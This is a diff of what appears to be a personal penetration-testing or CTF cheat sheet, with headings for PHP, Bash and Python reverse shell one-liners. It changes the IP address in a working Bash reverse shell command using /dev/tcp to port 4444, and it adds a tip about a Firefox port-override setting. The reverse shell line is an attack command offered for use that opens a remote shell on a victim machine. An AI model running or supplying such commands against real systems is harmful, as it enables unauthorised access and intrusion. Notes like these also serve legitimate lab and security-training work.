@@ -69,7 +69,9 @@ PHP REV SHELL ONE LINER
 
 BASH REV SHELL ONELINER
 
-`bash -i &>/dev/tcp/10.6.46.150/4444 <&1`
+`bash -i &>/dev/tcp/10.11.30.36/4444 <&1`
+
+
 
 <br />
 <br />
@@ -364,3 +366,8 @@ Python revererse shell one liner
 <br />
 
 `export PATH=$PATH` exports `$pwd` to path
+
+<br />
+<br />
+
+`network.security.ports.banned.override`  allows to view http even if it is on other port than 80
